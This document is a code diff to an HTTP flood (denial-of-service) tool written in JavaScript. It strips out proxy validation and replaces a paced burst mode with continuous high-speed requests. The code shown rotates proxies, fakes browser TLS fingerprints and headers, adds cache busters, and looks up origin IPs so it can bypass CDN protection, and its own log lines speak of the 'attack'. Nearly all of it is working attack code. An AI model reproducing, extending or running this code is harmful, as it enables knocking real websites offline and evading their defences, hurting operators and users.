@@ -223,29 +223,6 @@ function addRealisticDelay() {
     });
 }
 
-async function testProxy(proxyUrl, timeout = 800) {
-    try {
-        const agent = proxyUrl.startsWith('https') 
-            ? new HttpsProxyAgent(proxyUrl)
-            : new HttpProxyAgent(proxyUrl);
-        
-        await axios.get('http://1.1.1.1', {
-            httpAgent: agent,
-            httpsAgent: agent,
-            timeout: timeout,
-            validateStatus: () => true,
-            maxRedirects: 0
-        });
-        
-        return true;
-    } catch (error) {
-        if (error.response) {
-            return true;
-        }
-        return false;
-    }
-}
-
 async function loadProxies(filePath = 'proxies.txt') {
     try {
         const data = await fs.readFile(filePath, 'utf-8');
@@ -260,107 +237,16 @@ async function loadProxies(filePath = 'proxies.txt') {
         }
         
         console.log('\n' + '='.repeat(70));
-        console.log(`[*] PROXY VALIDATION`);
-        console.log(`[*] Total proxies: ${raw.length}`);
-        console.log(`[*] Concurrency: 500 parallel`);
-        console.log(`[*] Timeout: 800ms`);
-        console.log('='.repeat(70) + '\n');
+        console.log(`[*] LOADING PROXIES`);
+        console.log('='.repeat(70));
         
-        const temp = raw.map(proxy => 
+        config.proxies = raw.map(proxy => 
             proxy.startsWith('http') ? proxy : `http://${proxy}`
         );
         
-        const startTime = Date.now();
-        const chunkSize = 500;
-        let totalValid = 0;
-        let totalTested = 0;
-        
-        for (let i = 0; i < temp.length; i += chunkSize) {
-            const chunk = temp.slice(i, i + chunkSize);
-            const batchNum = Math.floor(i / chunkSize) + 1;
-            const totalBatches = Math.ceil(temp.length / chunkSize);
-            
-            console.log(`[BATCH ${batchNum}/${totalBatches}] Testing ${chunk.length} proxies...`);
-            
-            const batchStartTime = Date.now();
-            const batchValid = [];
-            
-            const results = await Promise.all(
-                chunk.map(async (proxy) => {
-                    try {
-                        const agent = proxy.startsWith('https') 
-                            ? new HttpsProxyAgent(proxy)
-                            : new HttpProxyAgent(proxy);
-                        
-                        await axios.get('http://1.1.1.1', {
-                            httpAgent: agent,
-                            httpsAgent: agent,
-                            timeout: 800,
-                            validateStatus: () => true
-                        });
-                        
-                        return { proxy, valid: true };
-                    } catch (error) {
-                        if (error.response) {
-                            return { proxy, valid: true };
-                        }
-                        return { proxy, valid: false };
-                    }
-                })
-            );
-            
-            results.forEach(result => {
-                if (result.valid) {
-                    config.proxies.push(result.proxy);
-                    batchValid.push(result.proxy.replace(/^https?:\/\//, ''));
-                    totalValid++;
-                }
-            });
-            
-            totalTested += chunk.length;
-            const batchTime = ((Date.now() - batchStartTime) / 1000).toFixed(1);
-            const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-            const speed = Math.floor(totalTested / (Date.now() - startTime) * 1000);
-            const remaining = temp.length - totalTested;
-            const eta = remaining > 0 ? Math.ceil(remaining / speed) : 0;
-            const successRate = ((totalValid / totalTested) * 100).toFixed(1);
-            
-            if (batchValid.length > 0) {
-                const display = batchValid.slice(0, 5).join(', ');
-                const more = batchValid.length > 5 ? ` (+${batchValid.length - 5} more)` : '';
-                console.log(`  [+] Found ${batchValid.length} valid: ${display}${more}`);
-            } else {
-                console.log(`  [-] Found 0 valid proxies in this batch`);
-            }
-            
-            console.log(`  [i] Progress: ${totalTested}/${temp.length} | Valid: ${totalValid} (${successRate}%)`);
-            console.log(`  [i] Speed: ${speed}/s | Batch: ${batchTime}s | ETA: ${eta}s\n`);
-        }
-        
-        const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
-        const avgSpeed = Math.floor(temp.length / (Date.now() - startTime) * 1000);
-        const finalRate = ((config.proxies.length / temp.length) * 100).toFixed(1);
-        
-        console.log('='.repeat(70));
-        console.log('[+] VALIDATION COMPLETE');
-        console.log('='.repeat(70));
-        console.log(`[+] Time: ${totalTime}s | Speed: ${avgSpeed} proxies/sec`);
-        console.log(`[+] Result: ${config.proxies.length}/${temp.length} working (${finalRate}%)`);
-        
-        if (config.proxies.length > 0) {
-            const samples = config.proxies.slice(0, 5).map(p => p.replace(/^https?:\/\//, ''));
-            console.log(`[+] Sample: ${samples.join(', ')}`);
-            if (config.proxies.length > 5) {
-                console.log(`[+] ... and ${config.proxies.length - 5} more ready to use`);
-            }
-        }
+        console.log(`[+] Loaded ${config.proxies.length} proxies (no validation)`);
+        console.log(`[+] Proxies will be used in rotation during attack`);
         console.log('='.repeat(70) + '\n');
-        
-        if (config.proxies.length === 0) {
-            console.log('[!] NO WORKING PROXIES FOUND!');
-            console.log('[!] Please check your proxy list quality\n');
-            return false;
-        }
         
         return true;
     } catch (err) {
@@ -473,12 +359,12 @@ class HTTPFlood {
         console.log(`[*] Target: ${this.url}`);
         console.log(`[*] Duration: ${this.duration}s`);
         console.log(`[*] Threads: ${this.threads}`);
-        console.log(`[*] Mode: BURST (3-7 requests per burst)`);
+        console.log(`[*] Mode: HIGH-SPEED CONTINUOUS`);
         console.log(`[*] JA3: Valid browser fingerprints enabled`);
         console.log(`[*] Emulation: Full browser headers + TLS`);
         
-        const estimatedBursts = this.threads * 12;
-        console.log(`[*] Estimated throughput: ${estimatedBursts * 3}-${estimatedBursts * 7} req/s`);
+        const estimatedRPS = this.threads * 200;
+        console.log(`[*] Estimated throughput: ${estimatedRPS}-${estimatedRPS * 3} req/s`);
         
         if (this.useOrigin && this.domain) {
             this.originIPs = await discoverOriginIPs(this.domain);
@@ -499,97 +385,86 @@ class HTTPFlood {
         let currentProxyIndex = config.proxies.length > 0 ? threadId % config.proxies.length : 0;
         let consecutiveFails = 0;
         let localCount = 0;
-        let burstCount = 0;
+        
+        const profile = getRandomElement(BROWSER_PROFILES);
+        let cachedAgent = null;
+        
+        const updateAgent = () => {
+            if (config.proxies.length > 0) {
+                const proxy = config.proxies[currentProxyIndex];
+                cachedAgent = createTLSAgent(profile, proxy);
+            } else {
+                cachedAgent = createTLSAgent(profile, null);
+            }
+        };
+        
+        updateAgent();
         
         const endTime = Date.now() + this.duration * 1000;
         
         while (this.running && Date.now() < endTime) {
-            const burstSize = Math.floor(Math.random() * 5) + 3;
-            const burstPromises = [];
-            
-            for (let b = 0; b < burstSize; b++) {
-                const requestPromise = (async () => {
-                    try {
-                        const profile = getRandomElement(BROWSER_PROFILES);
-                        const headers = getAdvancedHeaders(this.url, profile);
-                        
-                        let targetUrl = this.url;
-                        if (this.originIPs.length > 0 && this.useOrigin) {
-                            const originIP = getRandomElement(this.originIPs);
-                            if (originIP !== this.domain) {
-                                targetUrl = this.url.replace('https://', 'http://').replace(this.domain, originIP);
-                                headers['Host'] = this.domain;
-                            }
-                        }
-                        
-                        targetUrl = addCacheBuster(targetUrl);
-                        
-                        let agent;
-                        if (config.proxies.length > 0) {
-                            const proxy = config.proxies[currentProxyIndex];
-                            agent = createTLSAgent(profile, proxy);
-                        } else {
-                            agent = createTLSAgent(profile, null);
-                        }
-                        
-                        const axiosConfig = {
-                            method: this.method.toLowerCase(),
-                            url: targetUrl,
-                            headers,
-                            timeout: 5000,
-                            maxRedirects: 5,
-                            validateStatus: () => true,
-                            httpsAgent: agent,
-                            httpAgent: agent,
-                            proxy: false
-                        };
-                        
-                        if (this.method === 'POST') {
-                            axiosConfig.data = { payload: 'x'.repeat(Math.floor(Math.random() * 500) + 100) };
-                        }
-                        
-                        const response = await axios(axiosConfig);
-                        
-                        const bytesSent = JSON.stringify(headers).length + (axiosConfig.data ? JSON.stringify(axiosConfig.data).length : 0);
-                        const bytesReceived = response.data ? JSON.stringify(response.data).length : 0;
-                        
-                        updateStats(true, response.status, bytesSent, bytesReceived);
-                        
-                        if (config.proxies.length > 0 && localCount % 50 === 0) {
-                            const proxyIP = config.proxies[currentProxyIndex].replace(/^https?:\/\//, '').split(':')[0];
-                            config.workingProxies.add(proxyIP);
-                        }
-                        
-                        if (config.debug && localCount % 200 === 0) {
-                            console.log(`[DEBUG] Thread ${threadId}: ${response.status} - JA3: ${profile.name}`);
-                        }
-                        
-                        consecutiveFails = 0;
-                        localCount++;
-                        
-                    } catch (error) {
-                        updateStats(false);
-                        consecutiveFails++;
-                        
-                        if (config.debug && localCount < 10) {
-                            console.log(`[DEBUG] Thread ${threadId}: ${error.code || error.message}`);
-                        }
-                    }
-                })();
+            try {
+                const headers = getAdvancedHeaders(this.url, profile);
                 
-                burstPromises.push(requestPromise);
-            }
-            
-            await Promise.allSettled(burstPromises);
-            burstCount++;
-            
-            if (consecutiveFails >= 5 && config.proxies.length > 0) {
-                currentProxyIndex = (currentProxyIndex + 1) % config.proxies.length;
+                let targetUrl = this.url;
+                if (this.originIPs.length > 0 && this.useOrigin) {
+                    const originIP = getRandomElement(this.originIPs);
+                    if (originIP !== this.domain) {
+                        targetUrl = this.url.replace('https://', 'http://').replace(this.domain, originIP);
+                        headers['Host'] = this.domain;
+                    }
+                }
+                
+                targetUrl = addCacheBuster(targetUrl);
+                
+                const axiosConfig = {
+                    method: this.method.toLowerCase(),
+                    url: targetUrl,
+                    headers,
+                    timeout: 5000,
+                    maxRedirects: 5,
+                    validateStatus: () => true,
+                    httpsAgent: cachedAgent,
+                    httpAgent: cachedAgent,
+                    proxy: false
+                };
+                
+                if (this.method === 'POST') {
+                    axiosConfig.data = { payload: 'x'.repeat(500) };
+                }
+                
+                const response = await axios(axiosConfig);
+                
+                const bytesSent = JSON.stringify(headers).length + (axiosConfig.data ? JSON.stringify(axiosConfig.data).length : 0);
+                const bytesReceived = response.data ? String(response.data).length : 0;
+                
+                updateStats(true, response.status, bytesSent, bytesReceived);
+                
+                if (config.proxies.length > 0 && localCount % 50 === 0) {
+                    const proxyIP = config.proxies[currentProxyIndex].replace(/^https?:\/\//, '').split(':')[0];
+                    config.workingProxies.add(proxyIP);
+                }
+                
+                if (config.debug && localCount % 200 === 0) {
+                    console.log(`[DEBUG] Thread ${threadId}: ${response.status} - ${profile.name}`);
+                }
+                
                 consecutiveFails = 0;
-            }
-            
-            if (burstCount % 2 === 0) {
-                await new Promise(resolve => setTimeout(resolve, 50));
+                localCount++;
+                
+            } catch (error) {
+                updateStats(false);
+                consecutiveFails++;
+                
+                if (config.debug && consecutiveFails <= 3) {
+                    console.log(`[DEBUG] Thread ${threadId}: ${error.code || error.message}`);
+                }
+                
+                if (consecutiveFails >= 5 && config.proxies.length > 0) {
+                    currentProxyIndex = (currentProxyIndex + 1) % config.proxies.length;
+                    updateAgent();
+                    consecutiveFails = 0;
+                }
             }
         }
     }
